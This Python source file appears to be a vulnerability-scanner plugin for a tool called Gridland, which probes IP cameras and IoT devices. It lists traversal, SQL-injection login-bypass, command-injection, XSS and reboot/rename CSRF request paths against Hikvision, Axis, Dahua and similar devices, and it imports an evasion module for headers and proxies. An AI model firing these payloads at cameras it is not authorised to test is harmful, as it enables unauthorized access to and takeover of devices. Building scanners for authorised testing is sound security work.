"""
Vulnerability Scanner Plugin for Gridland
Detects known CVEs and security vulnerabilities in IP cameras and IoT devices
"""
import requests
import re
from typing import List, Dict, Any
from lib.plugins import ScannerPlugin, Finding
from lib.core import ScanTarget
from lib.evasion import get_request_headers, get_proxies
import os
import json
import time
from datetime import datetime, timedelta

CISA_KEV_URL = "https://www.cisa.gov/known-exploited-vulnerabilities-catalog/known-exploited-vulnerabilities.json"
CVE_CACHE_FILE = "cve_cache.json"
CACHE_DURATION_HOURS = 24


def update_cve_database() -> Dict:
    """
    Fetches the CISA Known Exploited Vulnerabilities (KEV) catalog and caches it.
    Updates the cache only if it's older than CACHE_DURATION_HOURS.
    """
    cache_exists = os.path.exists(CVE_CACHE_FILE)
    if cache_exists:
        last_modified_time = datetime.fromtimestamp(os.path.getmtime(CVE_CACHE_FILE))
        if datetime.now() - last_modified_time < timedelta(hours=CACHE_DURATION_HOURS):
            with open(CVE_CACHE_FILE, 'r') as f:
                return json.load(f)

    try:
        response = requests.get(CISA_KEV_URL, timeout=15)
        response.raise_for_status()
        data = response.json()
        with open(CVE_CACHE_FILE, 'w') as f:
            json.dump(data, f)
        return data
    except (requests.RequestException, json.JSONDecodeError) as e:
        print(f"Error updating CVE database: {e}")
        if cache_exists:
            with open(CVE_CACHE_FILE, 'r') as f:
                return json.load(f)
        return {}


class VulnerabilityScannerPlugin(ScannerPlugin):
    """
    Comprehensive vulnerability detection for IP cameras and IoT devices.
    Tests for known CVEs, authentication bypasses, and common exploits.
    """
    
    def can_scan(self, target: ScanTarget) -> bool:
        """Check if target has web ports for vulnerability testing"""
        vuln_ports = [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085]
        return any(p.port in vuln_ports for p in target.open_ports)

    # Known vulnerability signatures and exploit paths
    VULNERABILITY_TESTS = {
        # Directory Traversal Vulnerabilities
        "directory_traversal": {
            "paths": [
                "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo&-usr=admin&-pwd=admin&-file=../../../../etc/passwd",
                "/ISAPI/Security/sessionLogin/capabilities?username=admin'%20or%20'1'='1&password=admin",
                "/cgi-bin/nobody/VerifyCode.cgi?account=admin'or'1=1'%23",
                "/../../../../../../../etc/passwd",
                "/cgi-bin/supervisor.cgi?action=logincheck&user=admin&password=../../../../etc/passwd%00",
                "/axis-cgi/jpg/image.cgi?resolution=640x480&dummy=../../../../../../../etc/passwd"
            ],
            "indicators": ["root:", "daemon:", "nobody:", "www-data:", "passwd"],
            "severity": "critical",
            "description": "Directory traversal vulnerability allows reading system files"
        },
        
        # Authentication Bypass Vulnerabilities  
        "auth_bypass": {
            "paths": [
                "/cgi-bin/nobody/Machine.cgi?action=list",
                "/ISAPI/Security/userCheck",
                "/cgi-bin/hi3510/checkuser.cgi?&-name=admin&-passwd=",
                "/axis-cgi/admin/param.cgi?action=list&group=Network",
                "/admin/admin_testip.php",
                "/cgi-bin/operator/admin.cgi",
                "/sony/admin",
                "/panasonic/admin"
            ],
            "indicators": ["<admin>", "authentication", "login successful", "admin panel", "configuration"],
            "severity": "high",
            "description": "Authentication bypass allows unauthorized access"
        },
        
        # Command Injection Vulnerabilities
        "command_injection": {
            "paths": [
                "/cgi-bin/hi3510/test.cgi?cmd=cat%20/etc/passwd",
                "/cgi-bin/nobody/Machine.cgi?action=shellcommand&command=id",
                "/ISAPI/System/deviceInfo?devInfo=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%3e",
                "/axis-cgi/admin/param.cgi?action=update&root.Network.Interface.I0.IPv4.Address=`id`",
                "/cgi-bin/supervisor.cgi?action=&command=id;"
            ],
            "indicators": ["uid=", "gid=", "groups=", "root", "daemon"],
            "severity": "critical", 
            "description": "Command injection vulnerability allows remote code execution"
        },
        
        # Information Disclosure
        "info_disclosure": {
            "paths": [
                "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo",
                "/ISAPI/System/deviceInfo",
                "/axis-cgi/admin/param.cgi?action=list",
                "/cgi-bin/nobody/Machine.cgi?action=list",
                "/sony/common/appInfo.cgi",
                "/panasonic/config/config_backup.bin",
                "/admin/system_log.cgi",
                "/cgi-bin/supervisor.cgi?action=get&category=system.*"
            ],
            "indicators": ["version", "model", "serial", "firmware", "password", "key"],
            "severity": "medium",
            "description": "Information disclosure reveals sensitive system details"
        },
        
        # CSRF Vulnerabilities
        "csrf": {
            "paths": [
                "/admin/admin_testip.php?ip=127.0.0.1",
                "/cgi-bin/nobody/Machine.cgi?action=reboot",
                "/ISAPI/System/reboot",
                "/axis-cgi/admin/param.cgi?action=update&root.System.Name=HACKED"
            ],
            "indicators": ["success", "rebooting", "updated", "changed"],
            "severity": "medium",
            "description": "CSRF vulnerability allows unauthorized actions"
        }
    }

    # Brand-specific vulnerability tests
    BRAND_SPECIFIC_VULNS = {
        "hikvision": [
            "/ISAPI/Security/userCheck",  # CVE-2017-7921
            "/ISAPI/Streaming/channels/1/picture",  # Unauthorized access
            "/ISAPI/System/deviceInfo?format=json",  # Info disclosure
        ],
        "dahua": [
            "/current_config/passwd",  # CVE-2013-6117
            "/cgi-bin/snapshot.cgi",  # Unauthorized snapshots
            "/dms?nowprofileid=1",  # Stream access
        ],
        "axis": [
            "/axis-cgi/jpg/image.cgi",  # Unauthorized image access
            "/axis-cgi/admin/param.cgi?action=list",  # Config access
            "/axis-cgi/serverreport.cgi",  # System info
        ],
        "sony": [
            "/sony/common/appInfo.cgi",  # Version disclosure
            "/sony/config",  # Config access
            "/command/inquiry.cgi?inq=system",  # System inquiry
        ]
    }

    def scan(self, target: ScanTarget) -> List[Finding]:
        """Perform comprehensive vulnerability scanning using live CISA KEV data."""
        findings = []
        proxy_url = os.environ.get('PROXY_URL')
        cve_data = update_cve_database()
        
        if not cve_data or 'vulnerabilities' not in cve_data:
            return findings

        for port_result in target.open_ports:
            if port_result.port not in [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085]:
                continue

            protocol = "https" if port_result.port in [443, 8443] else "http"
            base_url = f"{protocol}://{target.ip}:{port_result.port}"

            # Check target against CISA KEV database
            for vuln in cve_data['vulnerabilities']:
                vendor = vuln.get('vendor', '').lower()
                product = vuln.get('product', '').lower()

                # Check if the target's brand matches the vendor/product
                if target.brand and (vendor in target.brand.lower() or product in target.brand.lower()):
                    # This is a simplified check. A real implementation would need
                    # more sophisticated logic to test for the specific CVE.
                    # For now, we will assume a match in brand indicates a potential vulnerability.
                    finding = Finding(
                        category="vulnerability",
                        description=f"Potential CISA KEV match: {vuln.get('cveID')} - {vuln.get('vulnerabilityName')}",
                        severity="high",
                        port=port_result.port,
                        url=base_url,
                        data={
                            "cveID": vuln.get('cveID'),
                            "vulnerabilityName": vuln.get('vulnerabilityName'),
                            "vendor": vuln.get('vendor'),
                            "product": vuln.get('product')
                        }
                    )
                    findings.append(finding)
        
        return findings

    def _test_vulnerability(self, base_url: str, vuln_type: str, vuln_data: Dict[str, Any], proxy_url: str = None) -> List[Finding]:
        """Test a specific vulnerability type"""
        findings = []
        
        for path in vuln_data["paths"]:
            try:
                url = f"{base_url}{path}"
                response = requests.get(
                    url,
                    timeout=5,
                    verify=False,
                    allow_redirects=True,
                    headers=get_request_headers(),
                    proxies=get_proxies(proxy_url)
                )
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Check for vulnerability indicators
                    for indicator in vuln_data["indicators"]:
                        if indicator.lower() in content:
                            finding = Finding(
                                category="vulnerability",
                                description=f"{vuln_data['description']} - {vuln_type}",
                                severity=vuln_data["severity"],
                                url=url,
                                data={
                                    "vulnerability_type": vuln_type,
                                    "indicator_found": indicator,
                                    "response_snippet": content[:200]
                                }
                            )
                            findings.append(finding)
                            break  # Only report once per path
                            
            except requests.RequestException:
                continue
                
        return findings

    def _test_brand_vulnerabilities(self, base_url: str, brand: str, brand_display: str, proxy_url: str = None) -> List[Finding]:
        """Test brand-specific known vulnerabilities"""
        findings = []
        
        for path in self.BRAND_SPECIFIC_VULNS.get(brand, []):
            try:
                url = f"{base_url}{path}"
                response = requests.get(
                    url,
                    timeout=5,
                    verify=False,
                    allow_redirects=True,
                    headers={'User-Agent': 'Mozilla/5.0 Security Scanner'}
                )
                
                # Different success criteria for different brands
                success_indicators = {
                    "hikvision": ["<ResponseStatus>", "deviceInfo", "userCheck"],
                    "dahua": ["admin:", "config", "passwd"],
                    "axis": ["root.", "Network", "System"],
                    "sony": ["appInfo", "sony", "version"]
                }
                
                if response.status_code == 200:
                    content = response.text.lower()
                    indicators = success_indicators.get(brand, ["admin", "config", "system"])
                    
                    for indicator in indicators:
                        if indicator.lower() in content:
                            finding = Finding(
                                category="vulnerability",
                                description=f"{brand_display}-specific vulnerability found",
                                severity="high",
                                url=url,
                                data={
                                    "vulnerability_type": f"{brand}_specific",
                                    "brand": brand_display,
                                    "indicator_found": indicator
                                }
                            )
                            findings.append(finding)
                            break
                            
            except requests.RequestException:
                continue
                
        return findings

    def get_description(self) -> str:
        """Get plugin description"""
        return "Comprehensive vulnerability scanner for IP cameras and IoT devices"